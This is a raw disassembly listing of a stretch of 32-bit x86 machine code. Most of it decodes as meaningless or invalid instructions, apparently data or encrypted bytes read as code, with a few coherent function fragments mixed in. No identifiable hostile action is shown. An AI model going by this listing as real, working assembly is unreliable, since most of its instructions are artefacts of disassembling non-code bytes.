  40b541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b542:	and    DWORD PTR [ecx],esp
  40b544:	xor    al,0x62
  40b546:	(bad)  
  40b547:	xchg   edi,eax
  40b548:	(bad)  
  40b549:	jecxz  0x40b4f1
  40b54b:	pop    edx
  40b54c:	dec    edx
  40b54d:	in     eax,0x14
  40b54f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b550:	mov    WORD PTR [ebx-0x6b568d19],?
  40b556:	les    ebp,FWORD PTR [ebp-0x4e]
  40b559:	push   ebp
  40b55a:	xchg   ecx,eax
  40b55b:	clc    
  40b55c:	call   0x2d373df7
  40b561:	add    ah,bh
  40b563:	jns    0x40b509
  40b565:	or     bl,BYTE PTR [ecx]
  40b567:	fdiv   DWORD PTR [edi+ecx*8-0x7b886852]
  40b56e:	sbb    al,0xb1
  40b570:	add    al,0x86
  40b572:	stos   BYTE PTR es:[edi],al
  40b573:	out    dx,al
  40b574:	or     al,0x4b
  40b576:	fnstenv [eax]
  40b578:	lods   al,BYTE PTR ds:[esi]
  40b579:	jle    0x40b5a9
  40b57b:	bnd ds jmp 0x40b5c7
  40b57f:	bound  edi,QWORD PTR [ebx*8+0x39582836]
  40b586:	adc    al,0x17
  40b588:	push   cs
  40b589:	mov    ah,0x9f
  40b58b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b58c:	lahf   
  40b58d:	or     edi,0x9
  40b590:	xor    DWORD PTR [ecx],0xffffff97
  40b593:	retf   
  40b594:	mov    ebp,0x8cdffda0
  40b599:	xchg   BYTE PTR [ecx],dh
  40b59b:	enter  0x4806,0x34
  40b59f:	dec    ecx
  40b5a0:	(bad)  
  40b5a1:	add    cl,BYTE PTR [edi]
  40b5a3:	idiv   BYTE PTR [ebp-0x52]
  40b5a6:	jmp    0x41acdbce
  40b5ab:	shl    BYTE PTR [ecx+eax*1+0x506c733d],cl
  40b5b2:	clc    
  40b5b3:	ds int 0xc5
  40b5b6:	fucomp st(3)
  40b5b8:	cmp    DWORD PTR [edi-0x54],esp
  40b5bb:	inc    edi
  40b5bc:	jns    0x40b56a
  40b5be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5bf:	test   eax,0xb8bd2310
  40b5c4:	int    0x1e
  40b5c6:	mov    eax,ds:0x7db61032
  40b5cb:	aam    0x37
  40b5cd:	sbb    eax,0x5b7f3004
  40b5d2:	jl     0x40b5fe
  40b5d4:	or     eax,0xe727aa34
  40b5d9:	mov    esp,DWORD PTR [ebx+0x3708c16f]
  40b5df:	xor    BYTE PTR [edi],dh
  40b5e1:	jge    0x40b603
  40b5e3:	adc    BYTE PTR [eax+ecx*8+0x58],ah
  40b5e7:	sbb    al,0x4f
  40b5e9:	retf   
  40b5ea:	mov    BYTE PTR [eax-0xa],0x79
  40b5ee:	icebp  
  40b5ef:	ja     0x40b5d3
  40b5f1:	test   DWORD PTR [esi-0x6b822b58],ecx
  40b5f7:	add    dl,BYTE PTR [edi+eax*2]
  40b5fa:	push   DWORD PTR [ecx+0xb2aafd5]
  40b600:	add    DWORD PTR [edi+0x3c73fad],0x92883977
  40b60a:	pop    ecx
  40b60b:	pop    ebp
  40b60c:	shr    BYTE PTR [edx-0x59],0xe3
  40b610:	fnsave [ecx]
  40b612:	lods   eax,DWORD PTR ds:[esi]
  40b613:	dec    eax
  40b614:	xlat   BYTE PTR ds:[ebx]
  40b615:	dec    esp
  40b616:	loop   0x40b64f
  40b618:	xlat   BYTE PTR ds:[ebx]
  40b619:	popf   
  40b61a:	in     al,dx
  40b61b:	test   DWORD PTR [edi],esi
  40b61d:	sub    DWORD PTR [ebx],eax
  40b61f:	mov    ds:0xbb3cdd5b,al
  40b624:	xchg   edi,eax
  40b625:	retf   0xbaed
  40b628:	fiadd  DWORD PTR [edi+ecx*1-0x25ae2c03]
  40b62f:	mov    dh,0xbe
  40b631:	cmp    bl,ah
  40b633:	sub    ah,BYTE PTR [eax]
  40b635:	adc    esp,DWORD PTR [eax]
  40b637:	ins    BYTE PTR es:[edi],dx
  40b638:	popf   
  40b639:	ins    DWORD PTR es:[edi],dx
  40b63a:	or     eax,edi
  40b63c:	xor    BYTE PTR [esi],dh
  40b63e:	icebp  
  40b63f:	jmp    0x713625e2
  40b644:	sbb    ebp,DWORD PTR [ecx]
  40b646:	loopne 0x40b5d4
  40b648:	lock aad 0xbb
  40b64b:	shl    DWORD PTR [ebp-0x2c],cl
  40b64e:	mov    es,ebx
  40b650:	ficomp WORD PTR [esp+edi*4]
  40b653:	xchg   esp,eax
  40b654:	popf   
  40b655:	ja     0x40b6cf
  40b657:	dec    edx
  40b658:	mov    WORD PTR [ebx],cs
  40b65a:	loope  0x40b603
  40b65c:	add    eax,0x386780c9
  40b661:	sahf   
  40b662:	jp     0x40b620
  40b664:	xchg   ebp,eax
  40b665:	(bad)  
  40b667:	scas   al,BYTE PTR es:[edi]
  40b668:	std    
  40b669:	adc    edi,ebx
  40b66b:	or     DWORD PTR [ebx-0x4ff39a2b],0x22
  40b672:	scas   al,BYTE PTR es:[edi]
  40b673:	jo     0x40b6db
  40b675:	mov    eax,ds:0xdc8dd697
  40b67a:	pop    esp
  40b67b:	adc    ah,BYTE PTR [ecx-0x32ed0dde]
  40b681:	into   
  40b682:	dec    edx
  40b683:	lock mov eax,DWORD PTR [eax+0xc]
  40b687:	mov    ecx,DWORD PTR [ecx]
  40b689:	jmp    0x40b841
  40b68e:	frndint 
  40b690:	std    
  40b691:	imul   ebx,DWORD PTR [ebp+0x69],0xffffffe9
  40b695:	mov    ch,BYTE PTR [edi+edx*8-0x20]
  40b699:	xor    edx,DWORD PTR [edi+0x2ae1b48d]
  40b69f:	repz jo 0x40b712
  40b6a2:	xchg   ebp,eax
  40b6a3:	jg     0x40b715
  40b6a5:	jo     0x40b6fa
  40b6a7:	inc    esp
  40b6a8:	push   ebx
  40b6a9:	std    
  40b6aa:	or     DWORD PTR [ecx],esi
  40b6ac:	sti    
  40b6ad:	ret    0x975
  40b6b0:	dec    eax
  40b6b1:	test   BYTE PTR [esi-0x48],cl
  40b6b4:	das    
  40b6b5:	mov    ebp,0x60fd5aea
  40b6ba:	push   cs
  40b6bb:	rcl    ebx,cl
  40b6bd:	rcl    BYTE PTR [edi+0x11],1
  40b6c0:	sub    al,0x45
  40b6c2:	adc    BYTE PTR [eax+0x59277065],bl
  40b6c8:	mov    eax,0x526198e0
  40b6cd:	fild   WORD PTR [edi]
  40b6cf:	xor    ecx,DWORD PTR [esi-0x11]
  40b6d2:	mov    ch,0xb8
  40b6d4:	cwde   
  40b6d5:	rcl    DWORD PTR [edx-0x3bfec16c],cl
  40b6db:	cmp    cl,0x20
  40b6de:	push   di
  40b6e0:	dec    edi
  40b6e1:	aaa    
  40b6e2:	hlt    
  40b6e3:	jecxz  0x40b687
  40b6e5:	(bad)  
  40b6e6:	leave  
  40b6e7:	into   
  40b6e8:	dec    edx
  40b6e9:	push   edi
  40b6ea:	inc    esp
  40b6eb:	imul   esp,esp,0x802e46af
  40b6f1:	je     0x40b75d
  40b6f3:	jmp    0x40b6d7
  40b6f5:	in     al,dx
  40b6f6:	adc    esi,esi
  40b6f8:	mov    edi,0xc05c6094
  40b6fd:	push   ebp
  40b6fe:	push   ds
  40b6ff:	mov    eax,0xfa1cf588
  40b704:	pop    ebx
  40b705:	add    BYTE PTR [ecx+0x5f14ed2a],ah
  40b70b:	repz loopne 0x40b781
  40b70e:	xchg   BYTE PTR [eax+0x3ddd40de],cl
  40b714:	rol    BYTE PTR [edx+0x75],1
  40b717:	dec    ecx
  40b718:	cld    
  40b719:	out    dx,eax
  40b71a:	jle    0x40b6f6
  40b71c:	in     al,dx
  40b71d:	push   esi
  40b71e:	outs   dx,BYTE PTR ds:[esi]
  40b71f:	mov    cl,0xb
  40b721:	mov    ebp,0x572f499c
  40b726:	fcom   st(0)
  40b728:	sbb    ebp,DWORD PTR [ebx-0x71]
  40b72b:	mov    ebx,0x569973c1
  40b730:	int    0xdc
  40b732:	ins    DWORD PTR es:[edi],dx
  40b733:	push   ebp
  40b734:	das    
  40b735:	repz out dx,al
  40b737:	and    bh,BYTE PTR [eax+0x29accd28]
  40b73d:	inc    ebx
  40b73e:	aad    0x6c
  40b740:	sub    eax,DWORD PTR [esi+ebx*2+0x3b7f9d01]
  40b747:	pop    ebp
  40b748:	stos   DWORD PTR es:[edi],eax
  40b749:	clc    
  40b74a:	pop    ss
  40b74b:	scas   al,BYTE PTR es:[edi]
  40b74c:	stos   DWORD PTR es:[edi],eax
  40b74d:	icebp  
  40b74e:	xor    al,0xd6
  40b750:	fsub   st,st(1)
  40b752:	call   0xf0f4fd29
  40b757:	dec    eax
  40b758:	cwde   
  40b759:	int    0x37
  40b75b:	inc    edx
  40b75c:	xlat   BYTE PTR ds:[ebx]
  40b75d:	imul   esi,DWORD PTR [edi+ecx*1+0x113fe290],0xa42cb6c0
  40b768:	inc    ebx
  40b769:	adc    bh,cl
  40b76b:	fwait
  40b76c:	sbb    al,0x5c
  40b76e:	stos   BYTE PTR es:[edi],al
  40b76f:	rcr    DWORD PTR ds:0x63e5471c,cl
  40b775:	outs   dx,DWORD PTR ds:[esi]
  40b776:	mov    esi,0xb1065cd7
  40b77b:	push   ebp
  40b77c:	popf   
  40b77d:	sub    al,0xa1
  40b77f:	in     al,dx
  40b780:	xlat   BYTE PTR ds:[ebx]
  40b781:	ja     0x40b7b1
  40b783:	jmp    0x40b77f
  40b785:	xor    al,0x47
  40b787:	add    al,0xfd
  40b789:	test   eax,0x4c4dc314
  40b78e:	push   edi
  40b78f:	data16 outs dx,BYTE PTR ss:[esi]
  40b792:	ins    DWORD PTR es:[edi],dx
  40b793:	xor    dh,BYTE PTR [ebp-0x71]
  40b796:	imul   DWORD PTR [ebp+esi*8-0x4f]
  40b79a:	or     al,dl
  40b79c:	jno    0x40b77d
  40b79e:	add    cl,0xd4
  40b7a1:	mov    eax,0x821b7724
  40b7a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7a7:	cmp    dh,BYTE PTR [ebx+0x14aa50a5]
  40b7ad:	mov    ecx,0x4c664e6f
  40b7b2:	bound  ecx,QWORD PTR [edi]
  40b7b4:	scas   al,BYTE PTR es:[edi]
  40b7b5:	in     al,dx
  40b7b6:	mov    al,ds:0xfdeecef6
  40b7bb:	push   ebp
  40b7bc:	push   ds
  40b7bd:	aaa    
  40b7be:	cmp    DWORD PTR [ecx],ecx
  40b7c0:	pop    ebx
  40b7c1:	push   0x2d
  40b7c3:	clc    
  40b7c4:	mov    eax,ds:0xec1d7672
  40b7c9:	and    BYTE PTR [ecx+0x5e],ch
  40b7cc:	push   cs
  40b7cd:	xor    BYTE PTR [eax+0x73],dl
  40b7d0:	es jmp 0xe4b9:0xb68f8020
  40b7d8:	push   edi
  40b7d9:	adc    DWORD PTR [esi],ecx
  40b7db:	lea    esp,[esi+0x19305592]
  40b7e1:	dec    edi
  40b7e2:	outs   dx,DWORD PTR ds:[esi]
  40b7e3:	hlt    
  40b7e4:	and    BYTE PTR [eax],0x36
  40b7e7:	cmp    ebx,ebx
  40b7e9:	and    al,0x9c
  40b7eb:	pop    esi
  40b7ec:	inc    ecx
  40b7ed:	pop    es
  40b7ee:	into   
  40b7ef:	popf   
  40b7f0:	test   al,0xc0
  40b7f2:	dec    ebx
  40b7f3:	fisub  WORD PTR [ecx+0xabcf056]
  40b7f9:	and    al,bh
  40b7fb:	test   al,0x7b
  40b7fd:	addr16 out dx,eax
  40b7ff:	mov    ds:0x2b530bb9,eax
  40b804:	outs   dx,BYTE PTR ds:[esi]
  40b805:	pop    ss
  40b806:	sbb    al,0xa9
  40b808:	cmp    eax,0x4525f41c
  40b80d:	push   esi
  40b80e:	lods   eax,DWORD PTR ds:[esi]
  40b810:	fbstp  TBYTE PTR [ebx+ebx*2]
  40b813:	cmp    BYTE PTR [eax+0x27],dl
  40b816:	push   ecx
  40b817:	scas   eax,DWORD PTR es:[edi]
  40b818:	not    bh
  40b81a:	std    
  40b81b:	popf   
  40b81c:	adc    ebp,edx
  40b81e:	outs   dx,DWORD PTR ds:[esi]
  40b81f:	nop
  40b820:	lock pop edx
  40b822:	xor    BYTE PTR [esi+0x17],0x15
  40b826:	lea    ecx,[edx]
  40b828:	fbld   TBYTE PTR [eax]
  40b82a:	cmp    BYTE PTR [edx+0x3e],bl
  40b82d:	cwde   
  40b82e:	call   ecx
  40b830:	jb     0x40b842
  40b832:	mov    ebp,0xb37185e9
  40b837:	sbb    BYTE PTR [ebx],0x9e
  40b83a:	jns    0x40b7cc
  40b83c:	jno    0x40b850
  40b83e:	das    
  40b83f:	outs   dx,DWORD PTR ds:[esi]
  40b840:	mov    al,BYTE PTR gs:[eax+ecx*1]
  40b844:	add    al,0x37
  40b846:	jmp    0x40b9fe
  40b84b:	hlt    
  40b84c:	sbb    eax,0x71518348
  40b851:	rep ins DWORD PTR es:[edi],dx
  40b853:	cmp    BYTE PTR [esp+ecx*2],al
  40b856:	aaa    
  40b857:	not    BYTE PTR [ebx-0xdb048e2]
  40b85d:	jo     0x40b8cf
  40b85f:	xchg   ebp,eax
  40b860:	jg     0x40b8d2
  40b862:	jo     0x40b884
  40b864:	cld    
  40b865:	loope  0x40b8d7
  40b867:	dec    edi
  40b868:	sub    esp,DWORD PTR [eax]
  40b86a:	pop    ecx
  40b86b:	xchg   ah,bl
  40b86d:	test   BYTE PTR [ecx+edx*8],ah
  40b870:	sbb    eax,0x95be28fd
  40b875:	xor    edx,DWORD PTR es:[eax+ecx*8-0x7e]
  40b87a:	fwait
  40b87b:	pop    edx
  40b87c:	imul   edi,DWORD PTR [ebx+0x47063b77],0xe0846f
  40b886:	push   ss
  40b887:	push   0x48
  40b889:	cs jbe 0x40b8ca
  40b88c:	shr    BYTE PTR [eax-0x1be176e9],cl
  40b892:	(bad)  
  40b894:	test   BYTE PTR [ecx],dl
  40b896:	mov    ebx,esi
  40b898:	clc    
  40b899:	pop    eax
  40b89a:	loopne 0x40b839
  40b89c:	mov    bh,0x14
  40b89e:	pushf  
  40b89f:	retf   0xae34
  40b8a2:	inc    eax
  40b8a3:	(bad)  
  40b8a4:	sub    eax,0x4fe6f084
  40b8a9:	jecxz  0x40b843
  40b8ab:	leave  
  40b8ac:	(bad)  
  40b8ad:	retf   
  40b8ae:	pop    ss
  40b8af:	push   cs
  40b8b0:	jle    0x40b874
  40b8b2:	cmp    BYTE PTR [ebx+0x772a676a],ch
  40b8b8:	outs   dx,BYTE PTR ds:[esi]
  40b8b9:	daa    
  40b8ba:	jae    0x40b87c
  40b8bc:	dec    ebp
  40b8bd:	push   ebp
  40b8be:	mov    bh,al
  40b8c0:	xor    DWORD PTR [ecx+edx*2-0x1e],esp
  40b8c4:	sbb    al,0x5b
  40b8c6:	fidiv  DWORD PTR [esi]
  40b8c8:	dec    ebp
  40b8c9:	popa   
  40b8ca:	fimul  WORD PTR [esi-0x30]
  40b8cd:	outs   dx,BYTE PTR ds:[esi]
  40b8ce:	mov    BYTE PTR [esi],dh
  40b8d0:	push   0xffffff98
  40b8d2:	cmp    al,0xc8
  40b8d4:	adc    al,0x49
  40b8d6:	cmc    
  40b8d7:	jb     0x40b8c8
  40b8d9:	ins    BYTE PTR es:[edi],dx
  40b8da:	xchg   ebp,eax
  40b8db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8dc:	jmp    0x33ad:0x52a3e143
  40b8e3:	or     DWORD PTR [edi],edi
  40b8e5:	mov    bl,0x9e
  40b8e7:	and    DWORD PTR gs:[ebx],ecx
  40b8ea:	call   FWORD PTR [ebx+0x58]
  40b8ed:	stos   DWORD PTR es:[edi],eax
  40b8ee:	cmp    ah,BYTE PTR [eax-0x362922eb]
  40b8f4:	lods   al,BYTE PTR ds:[esi]
  40b8f5:	popf   
  40b8f6:	sub    eax,0xd51b0cae
  40b8fb:	sbb    al,0x9
  40b8fd:	aaa    
  40b8fe:	inc    eax
  40b8ff:	sahf   
  40b900:	pop    edx
  40b901:	dec    ebx
  40b902:	(bad)  
  40b903:	repz fld st(0)
  40b906:	mov    dh,0xf3
  40b908:	mov    esp,fs
  40b90a:	xor    edi,DWORD PTR [esi+eax*4+0x0]
  40b90e:	add    al,0x5b
  40b910:	jne    0x40b986
  40b912:	push   cs
  40b913:	dec    esp
  40b914:	aam    0x55
  40b916:	xor    esp,esi
  40b918:	nop
  40b919:	xchg   esi,eax
  40b91a:	lahf   
  40b91b:	fst    QWORD PTR [ebx]
  40b91d:	cmp    DWORD PTR [edx-0x7e],eax
  40b920:	je     0x40b925
  40b922:	xlat   BYTE PTR ds:[ebx]
  40b923:	jmp    0xca98:0x9d0e3c17
  40b92a:	icebp  
  40b92b:	or     eax,0xa975166e
  40b930:	ret    
  40b931:	arpl   WORD PTR [edx+eax*2],ax
  40b934:	cwde   
  40b935:	jb     0x40b987
  40b937:	daa    
  40b938:	cs sbb dl,BYTE PTR gs:0xb8312e95
  40b940:	dec    esi
  40b941:	pop    ebx
  40b942:	scas   al,BYTE PTR es:[edi]
  40b943:	sahf   
  40b944:	lock retf 
  40b946:	or     al,0x92
  40b948:	pop    ebp
  40b949:	xchg   DWORD PTR [eax+0x48],edi
  40b94c:	daa    
  40b94d:	mov    eax,DWORD PTR [ebp-0x74c646c0]
  40b953:	ss or  al,0xf6
  40b956:	and    BYTE PTR [ecx+0x177615c9],al
  40b95c:	test   BYTE PTR [esp+edx*8],0xb7
  40b960:	(bad)  
  40b961:	mov    ebp,0xacb2c57d
  40b966:	sahf   
  40b967:	jp     0x40b975
  40b969:	mov    edi,0xac7151fa
  40b96e:	dec    edx
  40b96f:	pop    esi
  40b970:	mov    bh,0xa5
  40b972:	aaa    
  40b973:	inc    ebp
  40b974:	mov    esp,0xc211d7c0
  40b979:	pop    ebx
  40b97a:	sbb    DWORD PTR [eax+0x17],edi
  40b97d:	fcmovnb st,st(0)
  40b97f:	jno    0x40b9f5
  40b981:	in     eax,0x1b
  40b983:	aad    0x16
  40b985:	loop   0x40b9b8
  40b987:	cmp    ch,bh
  40b989:	mov    ebx,0x176b820a
  40b98e:	sbb    al,0x74
  40b990:	inc    ebx
  40b991:	adc    BYTE PTR [esp+esi*4+0x3b],0x1
  40b996:	lock repnz and al,0x85
  40b99a:	mov    dh,0x10
  40b99c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b99d:	ffree  st(4)
  40b99f:	push   0x12
  40b9a1:	mov    ecx,DWORD PTR [ecx]
  40b9a3:	mov    esp,0x955aa8da
  40b9a8:	add    ah,BYTE PTR [edi]
  40b9aa:	jbe    0x40b9a6
  40b9ac:	test   DWORD PTR [eax],0xfb33945b
  40b9b2:	enter  0x30c3,0x53
  40b9b6:	std    
  40b9b7:	inc    esi
  40b9b8:	fs cld 
  40b9ba:	xor    bl,bl
  40b9bc:	and    eax,0x1facb82f
  40b9c1:	stos   BYTE PTR es:[edi],al
  40b9c2:	push   esp
  40b9c3:	mov    cs,WORD PTR es:[edi-0x7128a6df]
  40b9ca:	std    
  40b9cb:	sbb    al,0x16
  40b9cd:	pop    ebx
  40b9ce:	out    0xad,al
  40b9d0:	pop    ebx
  40b9d1:	aas    
  40b9d2:	cwde   
  40b9d3:	imul   edx,edx,0x3bf8a24d
  40b9d9:	popf   
  40b9da:	out    dx,eax
  40b9db:	(bad)  
  40b9dc:	sub    esp,DWORD PTR [eax+0x14]
  40b9df:	bound  esi,QWORD PTR [eax]
  40b9e1:	xchg   ebx,eax
  40b9e2:	test   al,0x90
  40b9e4:	jp     0x40ba22
  40b9e6:	pop    ss
  40b9e7:	add    eax,0x76db33fa
  40b9ec:	pop    eax
  40b9ed:	call   FWORD PTR [edx+eiz*4]
  40b9f0:	mov    esp,0xad8f7389
  40b9f5:	nop
  40b9f6:	pop    esp
  40b9f7:	dec    ebx
  40b9f8:	add    eax,0x92f3ede2
  40b9fd:	popf   
  40b9fe:	xor    al,0x47
  40ba00:	cmp    al,0xc5
  40ba02:	je     0x40ba19
  40ba08:	mov    eax,DWORD PTR [ebp+0x8]
  40ba0b:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba0e:	xor    eax,esi
  40ba10:	add    eax,edi
  40ba12:	mov    DWORD PTR [ecx],eax
  40ba14:	jmp    0x40bbf5
  40ba19:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40ba20:	jmp    0x40bbf5
  40ba25:	mov    eax,DWORD PTR [ebp-0x8]
  40ba28:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ba2b:	mov    ecx,DWORD PTR [ecx]
  40ba2d:	mov    DWORD PTR [eax],ecx
  40ba2f:	mov    eax,DWORD PTR [ebp+0xc]
  40ba32:	jmp    0x40bbea
  40ba37:	retf   
  40ba38:	(bad)  [ebx+0x5171a9c1]
  40ba3e:	icebp  
  40ba3f:	dec    eax
  40ba40:	cmp    eax,0xfd30d6b
  40ba45:	jmp    0x40ba52
  40ba47:	in     al,0xf0
  40ba49:	jo     0x40babb
  40ba4b:	xchg   ebp,eax
  40ba4c:	jg     0x40babe
  40ba4e:	jo     0x40ba3d
  40ba50:	jecxz  0x40bac3
  40ba52:	(bad)  
  40ba53:	lahf   
  40ba54:	jnp    0x40ba6b
  40ba56:	jecxz  0x40ba2f
  40ba58:	mov    edx,0xf92030ec
  40ba5d:	ds mov ebx,0xa5754a99
  40ba63:	jns    0x40b9ed
  40ba65:	cmp    DWORD PTR [ebx+0x1a],ecx
  40ba68:	leave  
  40ba69:	fucomp st(5)
  40ba6b:	jg     0x40b9f1
  40ba6d:	mov    dh,0xd5
  40ba6f:	sbb    DWORD PTR [edi+0x7e],0xf782004a
  40ba76:	push   ecx
  40ba77:	inc    edi
  40ba78:	and    eax,0x3d09618e
  40ba7d:	pusha  
  40ba7e:	cdq    
  40ba7f:	stos   BYTE PTR es:[edi],al
  40ba80:	imul   esp,DWORD PTR [eax+eax*4-0x665172a4],0x20
  40ba88:	mov    DWORD PTR [ebp+eiz*1-0x5a],eax
  40ba8c:	mov    al,0x6
  40ba8e:	cmp    al,0xff
  40ba90:	or     al,0x9f
  40ba92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba93:	aam    0x1d
  40ba95:	retf   0xc64f
  40ba98:	ror    DWORD PTR [ebx-0x76],0x7
  40ba9c:	(bad)  
  40ba9d:	fs retf 0x5b66
  40baa1:	fdivp  st(3),st
  40baa3:	xor    BYTE PTR [edx+ecx*2+0x6d4c5999],0xfc
  40baab:	(bad)  [edx-0x21]
  40baae:	mov    dh,BYTE PTR [ebp-0x3a]
  40bab1:	popa   
  40bab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bab3:	and    edi,ebp
  40bab5:	ja     0x40bab1
  40bab7:	push   esi
  40bab8:	or     BYTE PTR fs:[edx],al
  40babb:	and    edi,DWORD PTR [esi]
  40babd:	mov    dl,BYTE PTR [ecx+0x7a1a1369]
  40bac3:	leave  
  40bac4:	push   eax
  40bac5:	rol    BYTE PTR ds:0xcc527fdd,cl
  40bacb:	lea    edi,[eax+0x6bfd0642]
  40bad1:	(bad)  
  40bad2:	mov    eax,0x45890fbf
  40bad7:	dec    ebx
  40bad8:	cld    
  40bad9:	add    DWORD PTR [eax],esp
  40badb:	ins    DWORD PTR es:[edi],dx
  40badc:	stos   DWORD PTR es:[edi],eax
  40badd:	ins    BYTE PTR es:[edi],dx
  40bade:	mov    al,0x93
  40bae0:	inc    esp
  40bae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bae2:	es es inc esp
  40bae5:	inc    esi
  40bae6:	inc    edi
  40bae7:	call   0x97f780eb
  40baec:	xor    BYTE PTR [esi-0x26429163],cl
  40baf2:	dec    ecx
  40baf3:	jg     0x40bb0b
  40baf5:	inc    esi
  40baf6:	push   0xffffff9e
  40baf8:	dec    ecx
  40baf9:	or     DWORD PTR [ebx+0x23658578],ebp
  40baff:	jp     0x40bab0
  40bb01:	lea    edi,[edx+0x16]
  40bb04:	jmp    0x40ba86
  40bb06:	imul   eax,DWORD PTR ds:0x6a388d42,0xfffffffe
  40bb0d:	cmp    BYTE PTR [ebx],bh
  40bb0f:	sti    
  40bb10:	jmp    0x3a1d6871
  40bb15:	mov    cl,0x11
  40bb17:	jmp    FWORD PTR ds:0x888af54
  40bb1d:	mov    ah,0xcc
  40bb1f:	or     eax,0xec4177ef
  40bb24:	fs jne 0x40bacc
  40bb27:	jge    0x40bab3
  40bb29:	imul   edx,DWORD PTR [ecx-0x3968a746],0xffffff84
  40bb30:	jns    0x40bac1
  40bb32:	mov    DWORD PTR [edi],eax
  40bb34:	push   ds
  40bb35:	push   eax
  40bb36:	push   es
  40bb37:	dec    esi
  40bb38:	and    esp,ebp
  40bb3a:	bound  ebx,QWORD PTR [ecx+eax*1]
  40bb3d:	cmp    eax,0xa4008ff4
  40bb42:	cmp    DWORD PTR [edx+eax*1-0xb],ebp
  40bb46:	mov    edi,0xb8d4df20
  40bb4b:	outs   dx,BYTE PTR ds:[esi]
  40bb4c:	outs   dx,DWORD PTR ds:[esi]
  40bb4d:	pshufw mm3,mm6,0x38
  40bb51:	gs pop ds
  40bb53:	lock jmp 0x40bad8
  40bb56:	mul    DWORD PTR [edx-0x23da5181]
  40bb5c:	xchg   esp,eax
  40bb5d:	ins    DWORD PTR es:[edi],dx
  40bb5e:	jge    0x40bb4f
  40bb60:	stc    
  40bb61:	xchg   BYTE PTR [ebp-0x18],cl
  40bb64:	xchg   edx,eax
  40bb65:	add    eax,0xfca87489
  40bb6a:	push   ebp
  40bb6b:	inc    esi
  40bb6c:	sbb    ebp,DWORD PTR [ecx+eax*8]
  40bb6f:	test   ah,0x16
  40bb72:	mov    ds:0x170cc0bc,al
  40bb77:	lds    esi,FWORD PTR [ebx+0x4a59c019]
  40bb7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb7e:	lods   al,BYTE PTR ds:[esi]
  40bb7f:	mov    ah,0xdc
  40bb81:	repz push ebx
  40bb83:	mov    esi,0xe5850f65
  40bb88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb89:	add    eax,0x7fcc80b8
  40bb8e:	pushf  
  40bb8f:	dec    ebp
  40bb90:	jge    0x40bb5b
  40bb92:	adc    ebp,edx
  40bb94:	ins    DWORD PTR es:[edi],dx
  40bb95:	mov    ?,WORD PTR [ebx+0x5140f47b]
  40bb9b:	cdq    
  40bb9c:	int3   
  40bb9d:	idiv   BYTE PTR [ebx]
  40bb9f:	push   ss
  40bba0:	loop   0x40bc09
  40bba2:	std    
  40bba3:	inc    esp
  40bba4:	add    dh,ah
  40bba6:	jg     0x40bc0c
  40bba8:	push   ss
  40bba9:	je     0x40bbf5
  40bbab:	push   ds
  40bbac:	mov    BYTE PTR [eax-0x5b],0xf
  40bbb0:	mov    bh,0x13
  40bbb2:	and    al,0x36
  40bbb4:	xchg   esi,eax
  40bbb5:	data16 jbe 0x40bb55
  40bbb8:	stos   BYTE PTR es:[edi],al
  40bbb9:	pusha  
  40bbba:	loop   0x40bb62
  40bbbc:	push   esi
  40bbbd:	hlt    
  40bbbe:	fldenv [edi-0x58]
  40bbc1:	in     al,dx
  40bbc2:	cwde   
  40bbc3:	fs icebp 
  40bbc5:	adc    al,0xe3
  40bbc7:	inc    esp
  40bbc8:	shl    DWORD PTR [ebx],1
  40bbca:	(bad)  
  40bbcb:	in     al,0xb1
  40bbcd:	xchg   ebp,eax
  40bbce:	scas   eax,DWORD PTR es:[edi]
  40bbcf:	mov    ah,0x6a
  40bbd1:	or     eax,0xe24fc8c5
  40bbd6:	ss pop eax
  40bbd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbd9:	mov    cl,0x7c
  40bbdb:	out    0x1b,eax
  40bbdd:	mov    DWORD PTR [ebx],eax
  40bbdf:	lds    edi,FWORD PTR [ecx]
  40bbe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbe2:	in     eax,0x28
  40bbe4:	mov    esi,0xcce7fe96
  40bbe9:	pop    edx
  40bbea:	mov    eax,DWORD PTR [ebp+0x8]
  40bbed:	push   DWORD PTR [ebp-0x8]
  40bbf0:	call   0x401000
  40bbf5:	mov    eax,DWORD PTR [ebp-0xc]
  40bbf8:	cmp    eax,ebx
  40bbfa:	je     0x40acdc
  40bc00:	mov    eax,DWORD PTR [ebp-0x8]
  40bc03:	mov    eax,DWORD PTR [eax]
  40bc05:	pop    edi
  40bc06:	pop    esi
  40bc07:	pop    ebx
  40bc08:	leave  
  40bc09:	ret    0x8
  40bc0c:	push   ebp
  40bc0d:	mov    ebp,esp
  40bc0f:	push   ecx
  40bc10:	sbb    DWORD PTR ds:0x43439a,ecx
  40bc16:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40bc1d:	sbb    eax,DWORD PTR ds:0x434392
  40bc23:	mov    eax,DWORD PTR [ebp+0x8]
  40bc26:	or     DWORD PTR ds:0x434415,0x432dbe
  40bc30:	jmp    0x40be4b
  40bc35:	push   es
  40bc36:	mov    ch,dl
  40bc38:	xor    al,0x72
  40bc3a:	je     0x40bc02
  40bc3c:	stos   BYTE PTR es:[edi],al
  40bc3d:	aas    
  40bc3e:	lods   al,BYTE PTR ds:[esi]
  40bc3f:	and    DWORD PTR [eax-0x385e9f62],edi
  40bc45:	jns    0x40bc45
  40bc47:	jo     0x40bcb9
  40bc49:	jb     0x40bcca
  40bc4b:	jo     0x40bcbd
  40bc4d:	mov    edx,0x92391783
  40bc52:	xchg   DWORD PTR [ebx],edi
  40bc54:	(bad)  
  40bc55:	outs   dx,BYTE PTR ds:[esi]
